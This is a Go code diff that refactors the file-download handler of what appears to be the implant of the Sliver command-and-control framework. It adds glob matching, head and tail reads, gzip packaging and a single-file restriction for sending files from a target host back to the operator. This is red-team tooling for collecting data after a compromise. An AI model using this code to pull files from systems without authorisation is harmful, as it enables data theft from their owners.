@@ -472,105 +472,197 @@ func pwdHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
-func prepareDownload(path string, filter string, recurse bool, maxBytes int64, maxLines int64) ([]byte, bool, int, int, error) {
+func readSingleFile(path string, maxBytes, maxLines int64) ([]byte, error) {
+	fileHandle, err := os.Open(path)
+	if err != nil {
+		return nil, err
+	}
+	defer fileHandle.Close()
+
 	/*
-		Combine the path and filter to see if the user wants
-		to download a single file
+		Made a bit of a design decision - this function is going to go for accuracy.
+		To that end, if maxLines is specified and those lines are all blank, that is
+		what the user will get back. The other approach would be to skip blank lines
+		but that would not be accurate. So if you head or tail a file that starts or
+		ends with blank lines, you are going to get those blank lines. :)
 	*/
-	var rawData []byte
-	var err error
 
-	fileInfo, err := os.Stat(path + filter)
-
-	if err != nil && os.IsNotExist(err) {
-		// Then the file does not exist
-		return nil, false, 0, 1, err
+	// If maxBytes is negative, seek to that many bytes from the end of the file
+	if maxBytes < 0 {
+		_, err = fileHandle.Seek(maxBytes, io.SeekEnd)
+		if err != nil {
+			return nil, err
+		}
 	}
 
-	if err == nil && !fileInfo.IsDir() {
-		// Then this is a single file
-		fileHandle, err := os.Open(path + filter)
-		if err != nil {
-			// Then we could not read the file
-			return nil, false, 0, 1, err
-		}
-		defer fileHandle.Close()
+	reader := bufio.NewReader(fileHandle)
+	lines := []string{}
+	var bytesRead int64 = 0
 
-		if maxBytes != 0 {
-			var readFirst bool = maxBytes > 0
-			if readFirst {
-				rawData = make([]byte, maxBytes)
-				_, err = fileHandle.Read(rawData)
-			} else {
-				rawData = make([]byte, maxBytes*-1)
-				var bytesToRead int64 = 0
-				if fileInfo.Size()+maxBytes < 0 {
-					bytesToRead = 0
-				} else {
-					bytesToRead = fileInfo.Size() + maxBytes
-				}
-				_, err = fileHandle.ReadAt(rawData, bytesToRead)
-			}
-
-		} else if maxLines != 0 {
-			var linesRead int64 = 0
-			var lines []string
-			var readFirst bool = true
-
-			if maxLines < 0 {
-				maxLines *= -1
-				readFirst = false
-			}
-
-			fileScanner := bufio.NewScanner(fileHandle)
-			for fileScanner.Scan() {
-				lines = append(lines, fileScanner.Text())
-				linesRead += 1
-				if linesRead == maxLines && readFirst {
-					break
-				}
-			}
-			err = fileScanner.Err()
-			if err == nil {
-				if readFirst {
-					rawData = []byte(strings.Join(lines, "\n"))
-				} else {
-					linePosition := int64(len(lines)) - maxLines
-					if linePosition < 0 {
-						linePosition = 0
-					}
-					rawData = []byte(strings.Join(lines[linePosition:], "\n"))
-				}
-			}
-		} else {
-			// Read the entire file
-			rawData = make([]byte, fileInfo.Size())
-			_, err = fileHandle.Read(rawData)
-		}
+	for {
+		// Read a single line
+		line, err := reader.ReadBytes('\n')
 		if err != nil && err != io.EOF {
-			// Then we could not read the file
-			return nil, false, 0, 1, err
+			// We hit an error trying to read the file
+			return nil, err
+		}
+
+		if maxBytes > 0 && bytesRead+int64(len(line)) > maxBytes {
+			// If we save this line, then we will have read too many bytes.
+			// Truncate the line
+			remainingBytes := maxBytes - bytesRead
+			line = line[:remainingBytes]
+		}
+
+		lines = append(lines, string(line))
+		bytesRead += int64(len(line))
+
+		// If this is the end of the file, then we are done reading the file
+		if err == io.EOF {
+			break
+		}
+
+		// If we have read the maximum number of bytes we are allowed to read, we are done reading the file
+		if maxBytes > 0 && bytesRead >= maxBytes {
+			break
+		}
+	}
+
+	// If maxLines is negative, slice the last maxLines * -1 lines
+	if maxLines < 0 {
+		// Determine where in the line buffer we should be for negative lines
+		startIndex := int64(len(lines)) + maxLines
+		if startIndex < 0 {
+			// Make sure we do not go out of bounds
+			startIndex = 0
+		}
+		lines = lines[startIndex:]
+	} else if maxLines > 0 && int64(len(lines)) > maxLines {
+		lines = lines[:maxLines]
+	}
+
+	// Join the lines
+	combinedFileData := strings.Join(lines, "")
+	return []byte(combinedFileData), nil
+}
+
+func readMultipleFiles(path string, filter string, recurse bool) *sliverpb.Download {
+	var downloadData bytes.Buffer
+	var downloadResponse *sliverpb.Download = &sliverpb.Download{
+		Path:            path + filter,
+		Exists:          true,
+		IsDir:           true,
+		ReadFiles:       0,
+		UnreadableFiles: 1,
+	}
+
+	readFiles, unreadableFiles, err := compressDir(path, filter, recurse, &downloadData)
+	// {{if .Config.Debug}}
+	log.Printf("error creating the archive: %v", err)
+	// {{end}}
+
+	downloadResponse.ReadFiles = int32(readFiles)
+	downloadResponse.UnreadableFiles = int32(unreadableFiles)
+	if err != nil {
+		downloadResponse.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%v", err),
+		}
+		return downloadResponse
+	}
+	gzipData := bytes.NewBuffer([]byte{})
+	gzipWrite(gzipData, downloadData.Bytes())
+	downloadResponse.Data = gzipData.Bytes()
+	downloadResponse.Encoder = "gzip"
+	downloadResponse.Response = &commonpb.Response{}
+
+	return downloadResponse
+}
+
+// func prepareDownload(path string, filter string, recurse bool, maxBytes int64, maxLines int64) ([]byte, bool, int, int, error) {
+func prepareDownload(path string, filter string, recurse bool, restrictedToFiles bool, maxBytes int64, maxLines int64) *sliverpb.Download {
+	var err error
+	// Default response
+	var downloadResponse *sliverpb.Download = &sliverpb.Download{
+		Path:            path + filter,
+		Exists:          false,
+		IsDir:           false,
+		ReadFiles:       0,
+		UnreadableFiles: 1,
+		Response:        &commonpb.Response{},
+	}
+
+	// Check to see how many files or dirs match path+filter
+	matches, err := filepath.Glob(path + filter)
+	if err != nil {
+		// If we got here, then there is something wrong with the supplied pattern
+		downloadResponse.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%v", err),
+		}
+		return downloadResponse
+	}
+
+	if len(matches) == 0 {
+		// Then nothing matches the pattern and there is nothing to download
+		downloadResponse.Response = &commonpb.Response{
+			Err: "no files match pattern",
+		}
+		return downloadResponse
+	} else if len(matches) == 1 {
+		fileInfo, err := os.Stat(matches[0])
+		if err != nil {
+			downloadResponse.Response = &commonpb.Response{
+				Err: fmt.Sprintf("%v", err),
+			}
+			return downloadResponse
+		}
+
+		if !fileInfo.IsDir() {
+			// If we are here, the user requested a single file
+			fileData, err := readSingleFile(matches[0], maxBytes, maxLines)
+			//{{if .Config.Debug}}
+			log.Printf("error while preparing download for %s: %v", matches[0], err)
+			//{{end}}
+			if err != nil {
+				downloadResponse.Response = &commonpb.Response{
+					Err: fmt.Sprintf("%v", err),
+				}
+				return downloadResponse
+			}
+			gzipData := bytes.NewBuffer([]byte{})
+			gzipWrite(gzipData, fileData)
+			downloadResponse.Path = matches[0]
+			downloadResponse.Data = gzipData.Bytes()
+			downloadResponse.Encoder = "gzip"
+			downloadResponse.Exists = true
+			downloadResponse.ReadFiles = 1
+			downloadResponse.UnreadableFiles = 0
+
+			return downloadResponse
 		} else {
-			return rawData, false, 1, 0, nil
+			if restrictedToFiles {
+				downloadResponse.Response = &commonpb.Response{
+					Err: "multiple files match pattern, command is restricted to one file",
+				}
+				return downloadResponse
+			}
+			downloadResponse = readMultipleFiles(path, filter, recurse)
+			return downloadResponse
 		}
 	}
 
 	// If we are here, then the user wants multiple files (a directory or part of a directory)
-	var downloadData bytes.Buffer
-	readFiles, unreadableFiles, err := compressDir(path, filter, recurse, &downloadData)
-	return downloadData.Bytes(), true, readFiles, unreadableFiles, err
+	if restrictedToFiles {
+		downloadResponse.Response = &commonpb.Response{
+			Err: "multiple files match pattern, command is restricted to one file",
+		}
+		return downloadResponse
+	}
+	downloadResponse = readMultipleFiles(path, filter, recurse)
+	return downloadResponse
 }
 
 // Send a file back to the hive
 func downloadHandler(data []byte, resp RPCResponse) {
-	var rawData []byte
-
-	/*
-		A flag for whether this is a directory - used if
-		this download is being looted
-	*/
-	var isDir bool
-
 	var download *sliverpb.Download
 
 	downloadReq := &sliverpb.DownloadReq{}
@@ -585,8 +677,7 @@ func downloadHandler(data []byte, resp RPCResponse) {
 	target, _ := filepath.Abs(downloadReq.Path)
 
 	if pathIsDirectory(target) {
-		// Even if the implant is running on Windows, Go can deal with "/" as a path separator
-		target += "/"
+		target += string(os.PathSeparator)
 		if downloadReq.RestrictedToFile {
 			/*
 				The user has asked to perform a download operation that should only be allowed on
@@ -609,36 +700,7 @@ func downloadHandler(data []byte, resp RPCResponse) {
 
 	path, filter := determineDirPathFilter(target)
 
-	rawData, isDir, readFiles, unreadableFiles, err := prepareDownload(path, filter, downloadReq.Recurse, downloadReq.MaxBytes, downloadReq.MaxLines)
-
-	if err != nil {
-		if isDir {
-			// {{if .Config.Debug}}
-			log.Printf("error creating the archive: %v", err)
-			// {{end}}
-		} else {
-			//{{if .Config.Debug}}
-			log.Printf("error while preparing download for %s: %v", target, err)
-			//{{end}}
-		}
-		download = &sliverpb.Download{Path: target, Exists: false, ReadFiles: int32(readFiles), UnreadableFiles: int32(unreadableFiles)}
-		download.Response = &commonpb.Response{
-			Err: fmt.Sprintf("%v", err),
-		}
-	} else {
-		gzipData := bytes.NewBuffer([]byte{})
-		gzipWrite(gzipData, rawData)
-		download = &sliverpb.Download{
-			Path:            target,
-			Data:            gzipData.Bytes(),
-			Encoder:         "gzip",
-			Exists:          true,
-			IsDir:           isDir,
-			ReadFiles:       int32(readFiles),
-			UnreadableFiles: int32(unreadableFiles),
-			Response:        &commonpb.Response{},
-		}
-	}
+	download = prepareDownload(path, filter, downloadReq.Recurse, downloadReq.RestrictedToFile, downloadReq.MaxBytes, downloadReq.MaxLines)
 
 	data, _ = proto.Marshal(download)
 	resp(data, err)
